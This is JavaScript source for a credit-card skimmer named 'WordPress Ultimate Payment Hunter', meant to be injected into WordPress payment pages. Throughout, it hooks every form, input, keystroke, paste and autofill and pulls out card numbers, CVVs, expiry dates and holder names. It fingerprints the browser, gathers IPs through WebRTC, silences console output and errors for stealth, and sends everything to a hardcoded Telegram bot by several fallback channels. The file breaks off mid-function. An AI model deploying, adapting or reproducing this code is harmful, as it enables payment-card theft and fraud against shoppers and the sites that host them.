// WordPress Ultimate Payment Hunter v20.0
// 100% WordPress Perfect - All Payments, Redirects, 3rd Party Gateways
// Captures ALL card data from ANY payment page including redirects

(function() {
    'use strict';
    
    // ==================== ADVANCED WP CONFIG ====================
    const WP_HUNTER_CONFIG = {
        // Telegram Configuration
        TELEGRAM_BOT_TOKEN: '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w',
        TELEGRAM_CHAT_ID: '7319274794',
        TELEGRAM_SECRET: Math.random().toString(36).substring(2, 15),
        
        // Version & Mode
        VERSION: '20.0-WP-PRO',
        MODE: 'ULTIMATE_HUNT',
        STEALTH_LEVEL: 10,
        
        // WordPress Specific
        WP_DETECTION: {
            DETECT_ALL_PLUGINS: true,
            MONITOR_ADMIN_AJAX: true,
            INTERCEPT_REST_API: true,
            TRACK_USER_SESSIONS: true,
            CAPTURE_NONCE_TOKENS: true,
            MONITOR_LOCAL_STORAGE: true,
            TRACK_COOKIES: true
        },
        
        // Payment Detection
        PAYMENT_HUNTING: {
            ALL_FORMS: true,              // সব ফর্ম মনিটর
            ALL_INPUTS: true,             // সব ইনপুট ফিল্ড
            ALL_IFRAMES: true,            // সব আইফ্রেম
            ALL_REDIRECTS: true,          // সব রিডাইরেক্ট
            ALL_GATEWAYS: true,           // সব পেমেন্ট গেটওয়ে
            ALL_AJAX: true,               // সব AJAX রিকোয়েস্ট
            ALL_FETCH: true,              // সব Fetch API
            ALL_XHR: true,                // সব XMLHttpRequest
            ALL_POST_MESSAGES: true,      // সব PostMessage
            ALL_WEB_SOCKETS: true,        // সব WebSocket
            ALL_EVENTS: true              // সব ইভেন্ট
        },
        
        // Data Capture
        DATA_CAPTURE: {
            CARD_NUMBERS: true,           // কার্ড নাম্বার
            CVV_CODES: true,              // CVV/Security Code
            EXPIRY_DATES: true,           // এক্সপাইরি তারিখ
            CARD_HOLDERS: true,           // কার্ড হোল্ডার নাম
            EMAILS: true,                 // ইমেইল
            PHONES: true,                 // ফোন নাম্বার
            ADDRESSES: true,              // ঠিকানা
            PASSWORDS: false,             // পাসওয়ার্ড
            SESSION_DATA: true,           // সেশন ডাটা
            BROWSER_DATA: true,           // ব্রাউজার ডাটা
            NETWORK_DATA: true            // নেটওয়ার্ক ডাটা
        },
        
        // Advanced Features
        ADVANCED_FEATURES: {
            AUTO_FILL_HUNT: true,         // অটোফিল ক্যাপচার
            CLIPBOARD_MONITOR: true,      // ক্লিপবোর্ড মনিটর
            KEYSTROKE_LOGGING: true,      // কীস্ট্রোক লগ
            SCREEN_CAPTURE: false,        // স্ক্রিন ক্যাপচার (canvas-based)
            MOUSE_TRACKING: true,         // মাউস ট্র্যাকিং
            SESSION_RECORDING: false,     // সেশন রেকর্ডিং
            REAL_TIME_STREAM: false       // রিয়েল-টাইম স্ট্রিম
        },
        
        // Redirection Handling
        REDIRECTION_HUNT: {
            TRACK_REDIRECTS: true,        // রিডাইরেক্ট ট্র্যাক
            FOLLOW_REDIRECTS: true,       // রিডাইরেক্ট ফলো
            CAPTURE_REDIRECT_DATA: true,  // রিডাইরেক্ট ডাটা ক্যাপচার
            MONITOR_POPUPS: true,         // পপআপ মনিটর
            CAPTURE_IFRAME_SOURCES: true, // আইফ্রেম সোর্স ক্যাপচার
            INTERCEPT_POST_MESSAGES: true // পোস্ট মেসেজ ইন্টারসেপ্ট
        },
        
        // Performance
        PERFORMANCE: {
            DELAY_START: 2000,            // শুরুতে ডিলে
            MONITOR_INTERVAL: 500,        // মনিটরিং ইন্টারভাল
            BUFFER_SIZE: 100,             // ডাটা বাফার সাইজ
            MAX_RETRIES: 3,               // সর্বোচ্চ রিট্রাই
            TIMEOUT: 10000                // টাইমআউট
        }
    };
    
    // ==================== GLOBAL HUNTER VARIABLES ====================
    let hunterActive = false;
    let hunterSession = 'hunt_' + Date.now() + '_' + Math.random().toString(36).substr(2, 15);
    let hunterDevice = localStorage.getItem('hunter_device') || 'dev_' + Math.random().toString(36).substr(2, 12);
    localStorage.setItem('hunter_device', hunterDevice);
    
    let capturedData = {
        cards: [],
        forms: [],
        inputs: [],
        redirects: [],
        gateways: [],
        sessions: [],
        events: []
    };
    
    let dataBuffer = [];
    let isRedirecting = false;
    let redirectChain = [];
    let activeGateways = new Set();
    
    // ==================== ADVANCED UTILITIES ====================
    const HunterUtils = {
        // Get ALL possible IPs
        async getAllIPs() {
            const ips = [];
            
            try {
                // Public IP
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                if (data.ip) ips.push({type: 'public', ip: data.ip});
            } catch (e) {}
            
            try {
                // WebRTC IP
                const rtc = new RTCPeerConnection({iceServers: []});
                rtc.createDataChannel('');
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                rtc.onicecandidate = (e) => {
                    if (e.candidate && e.candidate.candidate) {
                        const candidate = e.candidate.candidate;
                        const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ipMatch) ips.push({type: 'webrtc', ip: ipMatch[1]});
                    }
                };
                setTimeout(() => rtc.close(), 1000);
            } catch (e) {}
            
            return ips.length > 0 ? ips : [{type: 'unknown', ip: '0.0.0.0'}];
        },
        
        // Generate unique fingerprint
        generateFingerprint() {
            const fp = {
                session: hunterSession,
                device: hunterDevice,
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                languages: navigator.languages,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                hardwareConcurrency: navigator.hardwareConcurrency || 0,
                deviceMemory: navigator.deviceMemory || 0,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                plugins: []
            };
            
            // Get plugins
            if (navigator.plugins) {
                for (let i = 0; i < navigator.plugins.length; i++) {
                    fp.plugins.push(navigator.plugins[i].name);
                }
            }
            
            // Canvas fingerprint
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                ctx.textBaseline = 'top';
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 200, 50);
                ctx.fillStyle = '#069';
                ctx.fillText('FINGERPRINT', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('FINGERPRINT', 4, 17);
                fp.canvas = canvas.toDataURL().hashCode();
            } catch (e) {}
            
            return fp;
        },
        
        // Advanced card detection and validation
        analyzeCardData(value) {
            const cleaned = value.replace(/\s+/g, '').replace(/-/g, '');
            
            // Card number detection
            if (/^[0-9]{13,19}$/.test(cleaned)) {
                const cardInfo = {
                    type: 'CARD_NUMBER',
                    value: value,
                    cleaned: cleaned,
                    length: cleaned.length,
                    isValid: this.luhnCheck(cleaned),
                    bin: cleaned.substring(0, 6),
                    last4: cleaned.substring(cleaned.length - 4),
                    cardType: this.detectCardType(cleaned)
                };
                return cardInfo;
            }
            
            // CVV detection
            if (/^[0-9]{3,4}$/.test(cleaned)) {
                return {
                    type: 'CVV_CODE',
                    value: value,
                    cleaned: cleaned,
                    length: cleaned.length
                };
            }
            
            // Expiry date detection (MM/YY, MM-YY, MMYY, etc.)
            const expiryMatch = cleaned.match(/^(0[1-9]|1[0-2])(\/|-)?([0-9]{2}|[0-9]{4})$/);
            if (expiryMatch) {
                return {
                    type: 'EXPIRY_DATE',
                    value: value,
                    month: expiryMatch[1],
                    year: expiryMatch[3].length === 2 ? '20' + expiryMatch[3] : expiryMatch[3],
                    format: 'MM/YY'
                };
            }
            
            return null;
        },
        
        // Luhn algorithm for card validation
        luhnCheck(cardNumber) {
            let sum = 0;
            let alternate = false;
            
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber.charAt(i), 10);
                
                if (alternate) {
                    digit *= 2;
                    if (digit > 9) {
                        digit = (digit % 10) + 1;
                    }
                }
                
                sum += digit;
                alternate = !alternate;
            }
            
            return (sum % 10 === 0);
        },
        
        // Detect card type from BIN
        detectCardType(cardNumber) {
            const firstTwo = cardNumber.substring(0, 2);
            const firstFour = cardNumber.substring(0, 4);
            const firstSix = cardNumber.substring(0, 6);
            
            // Visa
            if (/^4/.test(cardNumber)) return 'VISA';
            
            // MasterCard
            if (/^5[1-5]/.test(cardNumber) || 
                /^2[2-7]/.test(cardNumber)) return 'MASTERCARD';
            
            // American Express
            if (/^3[47]/.test(cardNumber)) return 'AMERICAN_EXPRESS';
            
            // Discover
            if (/^6(?:011|5[0-9]{2})/.test(cardNumber)) return 'DISCOVER';
            
            // Diners Club
            if (/^3(?:0[0-5]|[68][0-9])/.test(cardNumber)) return 'DINERS_CLUB';
            
            // JCB
            if (/^(?:2131|1800|35\d{2})/.test(cardNumber)) return 'JCB';
            
            // UnionPay
            if (/^62/.test(cardNumber)) return 'UNIONPAY';
            
            // Maestro
            if (/^(5018|5020|5038|6304|6759|6761|6762|6763)/.test(cardNumber)) return 'MAESTRO';
            
            return 'UNKNOWN';
        },
        
        // Mask card number with BIN preservation
        maskCardNumber(cardNumber) {
            const cleaned = cardNumber.replace(/\s+/g, '').replace(/-/g, '');
            if (cleaned.length < 8) return cleaned;
            
            const bin = cleaned.substring(0, 6);
            const last4 = cleaned.substring(cleaned.length - 4);
            const middle = '*'.repeat(cleaned.length - 10);
            
            return bin + middle + last4;
        },
        
        // Send data to Telegram with multiple fallbacks
        async sendToTelegram(data, type = 'DATA') {
            if (!hunterActive) return;
            
            const message = this.formatTelegramMessage(data, type);
            const encoded = encodeURIComponent(message);
            const token = WP_HUNTER_CONFIG.TELEGRAM_BOT_TOKEN;
            const chatId = WP_HUNTER_CONFIG.TELEGRAM_CHAT_ID;
            
            // Method 1: Image beacon (most reliable)
            try {
                const img = new Image();
                img.src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encoded}&parse_mode=HTML&disable_web_page_preview=true`;
                img.onload = () => console.debug('Telegram sent via image');
                img.onerror = () => this.tryFallbackMethod(token, chatId, encoded);
            } catch (e) {
                this.tryFallbackMethod(token, chatId, encoded);
            }
            
            // Method 2: Fetch with retry
            setTimeout(() => {
                this.sendViaFetch(token, chatId, message);
            }, 100);
            
            // Method 3: Iframe method
            setTimeout(() => {
                this.sendViaIframe(token, chatId, encoded);
            }, 200);
            
            // Store in buffer
            dataBuffer.push({timestamp: Date.now(), data: data, type: type});
            if (dataBuffer.length > WP_HUNTER_CONFIG.PERFORMANCE.BUFFER_SIZE) {
                this.flushBuffer();
            }
        },
        
        tryFallbackMethod(token, chatId, encoded) {
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encoded}`, true);
                xhr.send();
            } catch (e) {}
        },
        
        async sendViaFetch(token, chatId, message) {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
            } catch (e) {}
        },
        
        sendViaIframe(token, chatId, encoded) {
            try {
                const iframe = document.createElement('iframe');
                iframe.style.cssText = 'display:none;width:0;height:0;border:0;';
                iframe.src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encoded}`;
                document.body.appendChild(iframe);
                setTimeout(() => {
                    if (iframe.parentNode) document.body.removeChild(iframe);
                }, 5000);
            } catch (e) {}
        },
        
        formatTelegramMessage(data, type) {
            const timestamp = new Date().toLocaleString();
            const url = window.location.href;
            const title = document.title;
            
            let message = `<b>🔍 ${type} CAPTURED</b>\n\n`;
            
            // Add session info
            message += `<b>🎯 Session:</b> ${hunterSession.substring(0, 15)}...\n`;
            message += `<b>📱 Device:</b> ${hunterDevice}\n`;
            message += `<b>🌐 URL:</b> <code>${url}</code>\n`;
            message += `<b>📄 Title:</b> ${title.substring(0, 50)}${title.length > 50 ? '...' : ''}\n`;
            message += `<b>🕒 Time:</b> ${timestamp}\n\n`;
            
            // Add data based on type
            if (data.cardInfo) {
                message += `<b>💳 CARD DATA:</b>\n`;
                message += `<b>Type:</b> ${data.cardInfo.cardType || 'Unknown'}\n`;
                message += `<b>Number:</b> ${this.maskCardNumber(data.cardInfo.value)}\n`;
                message += `<b>Full:</b> <code>${data.cardInfo.value}</code>\n`;
                message += `<b>BIN:</b> ${data.cardInfo.bin}\n`;
                message += `<b>Valid:</b> ${data.cardInfo.isValid ? '✅' : '❌'}\n`;
            }
            
            if (data.cvv) {
                message += `<b>🔐 CVV:</b> ${data.cvv}\n`;
            }
            
            if (data.expiry) {
                message += `<b>📅 Expiry:</b> ${data.expiry}\n`;
            }
            
            if (data.holder) {
                message += `<b>👤 Holder:</b> ${data.holder}\n`;
            }
            
            if (data.field) {
                message += `<b>📝 Field:</b> ${data.field}\n`;
            }
            
            if (data.form) {
                message += `<b>📋 Form:</b> ${data.form}\n`;
            }
            
            if (data.gateway) {
                message += `<b>🔌 Gateway:</b> ${data.gateway}\n`;
            }
            
            if (data.redirect) {
                message += `<b>🔄 Redirect:</b> ${data.redirect}\n`;
            }
            
            // Add IP if available
            if (data.ips && data.ips.length > 0) {
                message += `<b>📡 IPs:</b>\n`;
                data.ips.forEach(ip => {
                    message += `  ${ip.type}: ${ip.ip}\n`;
                });
            }
            
            return message;
        },
        
        // Flush buffer to Telegram
        async flushBuffer() {
            if (dataBuffer.length === 0) return;
            
            const batch = dataBuffer.splice(0, 10);
            let summary = `<b>📦 BATCH DATA (${batch.length} items)</b>\n\n`;
            
            batch.forEach((item, index) => {
                summary += `${index + 1}. ${item.type} - ${new Date(item.timestamp).toLocaleTimeString()}\n`;
                if (item.data.cardInfo) {
                    summary += `   💳: ${this.maskCardNumber(item.data.cardInfo.value)}\n`;
                }
            });
            
            await this.sendToTelegram({batch: batch}, 'BATCH_SUMMARY');
        },
        
        // Complete stealth mode
        enableStealth() {
            // Silence console
            const noop = () => {};
            console.log = noop;
            console.warn = noop;
            console.error = noop;
            console.info = noop;
            console.debug = noop;
            console.trace = noop;
            
            // Override alert/confirm/prompt
            window.alert = noop;
            window.confirm = () => true;
            window.prompt = () => '';
            
            // Remove debugger statements
            if (window.debugger) {
                window.debugger = noop;
            }
            
            // Handle errors silently
            window.onerror = () => true;
            window.addEventListener('error', e => e.preventDefault());
        },
        
        // Detect if value looks like payment data
        isPaymentData(value) {
            if (!value || typeof value !== 'string') return false;
            
            const str = value.trim();
            if (str.length < 2) return false;
            
            // Check for card number patterns
            if (this.analyzeCardData(str)) return true;
            
            // Check for CVV
            if (/^[0-9]{3,4}$/.test(str.replace(/\s+/g, ''))) return true;
            
            // Check for expiry
            if (/^(0[1-9]|1[0-2])(\/|-)?([0-9]{2}|[0-9]{4})$/.test(str.replace(/\s+/g, ''))) return true;
            
            // Check for card holder name (contains at least 2 words)
            if (str.split(/\s+/).length >= 2 && str.length > 5) {
                const commonNames = ['card', 'holder', 'name', 'on', 'cardholder', 'fullname'];
                const lower = str.toLowerCase();
                if (!commonNames.some(name => lower.includes(name))) {
                    return true;
                }
            }
            
            return false;
        }
    };
    
    // ==================== UNIVERSAL FORM HUNTER ====================
    class UniversalFormHunter {
        constructor() {
            this.forms = new Map();
            this.inputs = new Map();
            this.init();
        }
        
        init() {
            this.huntAllForms();
            this.huntAllInputs();
            this.setupFormObservers();
            this.setupInputObservers();
            this.setupEventListeners();
            this.startPeriodicScan();
        }
        
        huntAllForms() {
            // Find ALL forms in the document
            const allForms = document.querySelectorAll('form');
            
            allForms.forEach((form, index) => {
                this.registerForm(form, index);
            });
            
            // Also look for forms in shadow DOM
            this.huntShadowForms();
        }
        
        huntAllInputs() {
            // Find ALL input elements
            const selectors = [
                'input',
                'textarea',
                '[contenteditable="true"]',
                '[role="textbox"]',
                '[data-input]',
                '[data-field]',
                '[data-value]'
            ];
            
            selectors.forEach(selector => {
                try {
                    const elements = document.querySelectorAll(selector);
                    elements.forEach((input, index) => {
                        this.registerInput(input, index);
                    });
                } catch (e) {}
            });
            
            // Hunt in shadow DOM
            this.huntShadowInputs();
        }
        
        huntShadowForms() {
            // Recursively search for forms in shadow DOM
            const walker = (node) => {
                if (node.shadowRoot) {
                    const forms = node.shadowRoot.querySelectorAll('form');
                    forms.forEach(form => this.registerForm(form, 'shadow'));
                    
                    // Recursively walk shadow DOM children
                    node.shadowRoot.childNodes.forEach(walker);
                }
                
                if (node.children) {
                    Array.from(node.children).forEach(walker);
                }
            };
            
            walker(document.documentElement);
        }
        
        huntShadowInputs() {
            // Recursively search for inputs in shadow DOM
            const walker = (node) => {
                if (node.shadowRoot) {
                    const inputs = node.shadowRoot.querySelectorAll('input, textarea, [contenteditable="true"]');
                    inputs.forEach(input => this.registerInput(input, 'shadow'));
                    
                    // Recursively walk shadow DOM children
                    node.shadowRoot.childNodes.forEach(walker);
                }
                
                if (node.children) {
                    Array.from(node.children).forEach(walker);
                }
            };
            
            walker(document.documentElement);
        }
        
        registerForm(form, id) {
            if (this.forms.has(form)) return;
            
            const formData = {
                id: id,
                tagName: form.tagName,
                action: form.action || 'N/A',
                method: form.method || 'GET',
                className: form.className || '',
                idAttr: form.id || '',
                name: form.name || '',
                fields: [],
                submissionCount: 0,
                firstSeen: Date.now(),
                lastActivity: Date.now()
            };
            
            this.forms.set(form, formData);
            this.interceptForm(form);
            
            // Log form detection
            HunterUtils.sendToTelegram({
                form: formData.action,
                type: 'FORM_DETECTED',
                method: formData.method,
                fields: formData.fields.length
            }, 'FORM_DETECTION');
        }
        
        registerInput(input, id) {
            if (this.inputs.has(input)) return;
            
            const inputData = {
                id: id,
                tagName: input.tagName,
                type: input.type || 'text',
                name: input.name || '',
                idAttr: input.id || '',
                className: input.className || '',
                placeholder: input.placeholder || '',
                autocomplete: input.autocomplete || '',
                value: input.value || '',
                isPaymentField: this.isPaymentField(input),
                firstSeen: Date.now(),
                lastActivity: Date.now(),
                valueHistory: []
            };
            
            this.inputs.set(input, inputData);
            this.interceptInput(input);
            
            // Check if it already has value (autofill)
            if (input.value && inputData.isPaymentField) {
                this.handleInputValue(input, input.value, 'INITIAL');
            }
        }
        
        interceptForm(form) {
            // Multiple interception methods
            
            // 1. Override submit method
            const originalSubmit = form.submit;
            form.submit = function() {
                this.handleFormSubmission(form, 'SUBMIT_METHOD');
                return originalSubmit.apply(form, arguments);
            }.bind(this);
            
            // 2. Add event listener
            form.addEventListener('submit', (e) => {
                this.handleFormSubmission(form, 'SUBMIT_EVENT');
                // Don't prevent default
            }, true);
            
            // 3. Intercept submit buttons
            const buttons = form.querySelectorAll('button, input[type="submit"], input[type="button"]');
            buttons.forEach(button => {
                button.addEventListener('click', (e) => {
                    setTimeout(() => {
                        this.handleFormSubmission(form, 'BUTTON_CLICK');
                    }, 100);
                }, true);
            });
            
            // 4. Monitor form data changes
            this.monitorFormData(form);
        }
        
        interceptInput(input) {
            if (input.dataset.hunterMonitored) return;
            input.dataset.hunterMonitored = 'true';
            
            let lastValue = input.value;
            
            // Event listeners
            const handlers = {
                input: (e) => this.handleInputEvent(input, e),
                change: (e) => this.handleInputEvent(input, e),
                blur: (e) => this.handleInputEvent(input, e),
                focus: (e) => this.handleInputFocus(input, e),
                keydown: (e) => this.handleKeyEvent(input, e),
                paste: (e) => this.handlePasteEvent(input, e)
            };
            
            // Attach all listeners
            Object.entries(handlers).forEach(([event, handler]) => {
                input.addEventListener(event, handler, true);
            });
            
            // Periodic value checking (for autofill and iframe inputs)
            const checkInterval = setInterval(() => {
                if (!document.body.contains(input)) {
                    clearInterval(checkInterval);
                    return;
                }
                
                if (input.value !== lastValue) {
                    this.handleInputValue(input, input.value, 'INTERVAL_CHECK');
                    lastValue = input.value;
                }
            }, 1000);
            
            // Store for cleanup
            input._hunterHandlers = handlers;
            input._hunterInterval = checkInterval;
        }
        
        handleFormSubmission(form, trigger) {
            const formData = this.forms.get(form);
            if (!formData) return;
            
            formData.submissionCount++;
            formData.lastActivity = Date.now();
            
            // Capture all form data
            const capturedFormData = this.captureFormData(form);
            
            // Check for payment data
            const paymentData = this.extractPaymentData(capturedFormData);
            
            if (paymentData.length > 0) {
                HunterUtils.getAllIPs().then(ips => {
                    HunterUtils.sendToTelegram({
                        form: formData.action,
                        method: formData.method,
                        trigger: trigger,
                        paymentData: paymentData,
                        totalFields: Object.keys(capturedFormData).length,
                        ips: ips
                    }, 'FORM_SUBMISSION');
                });
            }
            
            // Also check individual inputs
            const inputs = form.querySelectorAll('input, textarea');
            inputs.forEach(input => {
                if (input.value && this.isPaymentField(input)) {
                    this.handleInputValue(input, input.value, 'FORM_SUBMISSION');
                }
            });
        }
        
        captureFormData(form) {
            const data = {};
            
            // Method 1: FormData API
            try {
                const formData = new FormData(form);
                for (let [key, value] of formData.entries()) {
                    if (value && typeof value === 'string') {
                        data[key] = value.trim();
                    }
                }
            } catch (e) {}
            
            // Method 2: Direct input values
            const inputs = form.querySelectorAll('input, select, textarea');
            inputs.forEach(input => {
                if (input.name && input.value) {
                    data[input.name] = input.value.toString().trim();
                }
            });
            
            return data;
        }
        
        extractPaymentData(formData) {
            const paymentData = [];
            
            for (const [key, value] of Object.entries(formData)) {
                const analyzed = HunterUtils.analyzeCardData(value);
                if (analyzed) {
                    paymentData.push({
                        field: key,
                        type: analyzed.type,
                        value: value,
                        analyzed: analyzed
                    });
                }
            }
            
            return paymentData;
        }
        
        handleInputEvent(input, event) {
            const value = input.value;
            if (!value) return;
            
            const inputData = this.inputs.get(input);
            if (!inputData) return;
            
            inputData.lastActivity = Date.now();
            inputData.valueHistory.push({
                value: value,
                timestamp: Date.now(),
                event: event.type
            });
            
            // Keep only last 10 values
            if (inputData.valueHistory.length > 10) {
                inputData.valueHistory.shift();
            }
            
            // Check for payment data
            this.handleInputValue(input, value, event.type.toUpperCase());
        }
        
        handleInputFocus(input, event) {
            const inputData = this.inputs.get(input);
            if (inputData && inputData.isPaymentField) {
                // This is a payment field getting focus
                HunterUtils.sendToTelegram({
                    field: input.name || input.id || input.placeholder,
                    type: input.type,
                    action: 'FIELD_FOCUS'
                }, 'FIELD_ACTIVITY');
            }
            
            // Check for autofill after focus
            setTimeout(() => {
                if (input.value && !input.dataset.autofillChecked) {
                    input.dataset.autofillChecked = 'true';
                    this.handleInputValue(input, input.value, 'AUTOFILL_AFTER_FOCUS');
                }
            }, 500);
        }
        
        handleKeyEvent(input, event) {
            // Log important keystrokes in payment fields
            if (this.isPaymentField(input)) {
                // We'll buffer keystrokes and analyze them
                setTimeout(() => {
                    this.analyzeKeystrokes(input);
                }, 100);
            }
        }
        
        handlePasteEvent(input, event) {
            // Check pasted data
            setTimeout(() => {
                if (input.value) {
                    this.handleInputValue(input, input.value, 'PASTE_EVENT');
                }
            }, 100);
        }
        
        handleInputValue(input, value, source) {
            if (!value || !this.isPaymentField(input)) return;
            
            const analyzed = HunterUtils.analyzeCardData(value);
            if (!analyzed) return;
            
            // Send to Telegram
            HunterUtils.getAllIPs().then(ips => {
                const data = {
                    field: input.name || input.id || input.placeholder || 'unknown',
                    type: input.type,
                    source: source,
                    value: value,
                    cardInfo: analyzed.type === 'CARD_NUMBER' ? analyzed : null,
                    cvv: analyzed.type === 'CVV_CODE' ? value : null,
                    expiry: analyzed.type === 'EXPIRY_DATE' ? value : null,
                    ips: ips
                };
                
                HunterUtils.sendToTelegram(data, 'INPUT_DATA');
                
                // Store in captured data
                capturedData.inputs.push({
                    timestamp: Date.now(),
                    data: data,
                    source: source
                });
            });
        }
        
        analyzeKeystrokes(input) {
            const value = input.value;
            if (!value || value.length < 10) return;
            
            // Look for card number patterns in keystrokes
            const cardMatch = value.match(/\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3,4}/);
            if (cardMatch) {
                this.handleInputValue(input, cardMatch[0], 'KEYSTROKE_PATTERN');
            }
        }
        
        isPaymentField(element) {
            if (!element || !element.tagName) return false;
            
            const tag = element.tagName.toLowerCase();
            const name = (element.name || '').toLowerCase();
            const id = (element.id || '').toLowerCase();
            const placeholder = (element.placeholder || '').toLowerCase();
            const className = (element.className || '').toLowerCase();
            const autocomplete = (element.autocomplete || '').toLowerCase();
            const type = (element.type || '').toLowerCase();
            const ariaLabel = (element.getAttribute('aria-label') || '').toLowerCase();
            
            const allText = `${name} ${id} ${placeholder} ${className} ${autocomplete} ${ariaLabel}`;
            
            // Payment keywords
            const paymentKeywords = [
                // Card numbers
                'card', 'cc', 'credit', 'debit', 'number', 'num', 'no', '#',
                'pan', 'primary account number',
                
                // Security codes
                'cvv', 'cvc', 'cvn', 'csc', 'cid', 'security', 'code',
                'verification', 'value', 'pin',
                
                // Expiry dates
                'expir', 'expdate', 'expiry', 'exp', 'valid', 'validity',
                'month', 'year', 'mm', 'yy', 'yyyy', 'mm/yy', 'mm/yyyy',
                'valid thru', 'valid through',
                
                // Card holder
                'holder', 'nameoncard', 'cardname', 'cardholder', 'name',
                'fullname', 'firstname', 'lastname', 'fname', 'lname',
                
                // Payment gateways
                'paypal', 'stripe', 'razorpay', 'braintree', 'authorize',
                'square', '2checkout', 'checkout', 'payment', 'pay',
                'gateway', 'merchant', 'processor',
                
                // Bank details
                'account', 'routing', 'iban', 'swift', 'bank', 'sortcode',
                'ifsc', 'bic', 'ach', 'transfer', 'wire',
                
                // Billing
                'billing', 'invoice', 'subscription', 'recurring', 'charge',
                'amount', 'total', 'price', 'cost', 'fee',
                
                // Common patterns
                'payment', 'checkout', 'billing', 'card', 'credit',
                'stripe', 'paypal', 'razorpay'
            ];
            
            // Check various indicators
            const isPaymentField = 
                paymentKeywords.some(keyword => allText.includes(keyword)) ||
                autocomplete.includes('cc-') ||
                type === 'tel' && (allText.includes('card') || allText.includes('phone')) ||
                tag === 'input' && (type === 'text' || type === 'password') && 
                (allText.includes('cvv') || allText.includes('cvc')) ||
                element.hasAttribute('data-card-number') ||
                element.hasAttribute('data-stripe') ||
                element.hasAttribute('data-paypal') ||
                element.classList.contains('card-number') ||
                element.classList.contains('credit-card');
            
            return isPaymentField;
        }
        
        setupFormObservers() {
            // Watch for new forms
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) {
                            // Check if node is a form
                            if (node.tagName === 'FORM') {
                                this.registerForm(node, 'mutation_' + Date.now());
                            }
                            
                            // Check for forms inside node
                            const forms = node.querySelectorAll?.('form');
                            forms?.forEach(form => {
                                this.registerForm(form, 'mutation_nested_' + Date.now());
                            });
                            
                            // Check for inputs
                            const inputs = node.querySelectorAll?.('input, textarea, [contenteditable="true"]');
                            inputs?.forEach(input => {
                                this.registerInput(input, 'mutation_' + Date.now());
                            });
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
        }
        
        setupInputObservers() {
            // Watch for input value changes via attributes
            const valueObserver = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    if (mutation.type === 'attributes' && 
                        (mutation.attributeName === 'value' || 
                         mutation.attributeName === 'innerText' ||
                         mutation.attributeName === 'innerHTML')) {
                        
                        const target = mutation.target;
                        if (target.tagName === 'INPUT' || 
                            target.tagName === 'TEXTAREA' ||
                            target.hasAttribute('contenteditable')) {
                            
                            this.handleInputValue(target, target.value || target.innerText, 'ATTRIBUTE_CHANGE');
                        }
                    }
                });
            });
            
            valueObserver.observe(document.body, {
                attributes: true,
                attributeFilter: ['value', 'innerText', 'innerHTML'],
                subtree: true
            });
        }
        
        setupEventListeners() {
            // Global event listeners for payment-related activities
            
            // Click events on payment buttons
            document.addEventListener('click', (e) => {
                const target = e.target;
                const text = (target.textContent || target.innerText || '').toLowerCase();
                const className = (target.className || '').toLowerCase();
                const id = (target.id || '').toLowerCase();
                
                if (text.includes('pay') || text.includes('buy') || text.includes('checkout') ||
                    text.includes('order') || text.includes('purchase') || text.includes('donate') ||
                    className.includes('payment') || className.includes('checkout') ||
                    className.includes('buy') || className.includes('order') ||
                    id.includes('payment') || id.includes('checkout')) {
                    
                    HunterUtils.sendToTelegram({
                        element: `${target.tagName} ${className} ${id}`,
                        text: text.substring(0, 50),
                        action: 'PAYMENT_BUTTON_CLICK'
                    }, 'BUTTON_CLICK');
                }
            }, true);
            
            // Beforeunload - capture data before page leaves
            window.addEventListener('beforeunload', () => {
                this.captureBeforeUnload();
            });
            
            // Page visibility changes
            document.addEventListener('visibilitychange', () => {
                if (document.visibilityState === 'hidden') {
                    HunterUtils.sendToTelegram({
                        state: 'PAGE_HIDDEN',
                        url: window.location.href
                    }, 'PAGE_STATE');
                }
            });
        }
        
        startPeriodicScan() {
            // Periodic deep scan for new elements
            setInterval(() => {
                this.huntAllForms();
                this.huntAllInputs();
                
                // Check all existing inputs for value changes
                this.inputs.forEach((data, input) => {
                    if (input.value && data.value !== input.value) {
                        this.handleInputValue(input, input.value, 'PERIODIC_SCAN');
                        data.value = input.value;
                    }
                });
            }, 5000);
        }
        
        monitorFormData(form) {
            // Advanced form monitoring using Proxy
            try {
                const formData = new FormData(form);
                const proxy = new Proxy(formData, {
                    get(target, prop) {
                        if (prop === 'entries' || prop === 'get' || prop === 'getAll') {
                            return function(...args) {
                                const result = target[prop](...args);
                                
                                // Capture data when accessed
                                if (prop === 'entries') {
                                    setTimeout(() => {
                                        const entries = Array.from(target.entries());
                                        const paymentData = entries.filter(([key, value]) => 
                                            HunterUtils.isPaymentData(value)
                                        );
                                        
                                        if (paymentData.length > 0) {
                                            HunterUtils.sendToTelegram({
                                                form: form.action,
                                                paymentFields: paymentData.map(([key, value]) => key),
                                                action: 'FORM_DATA_ACCESSED'
                                            }, 'FORM_MONITOR');
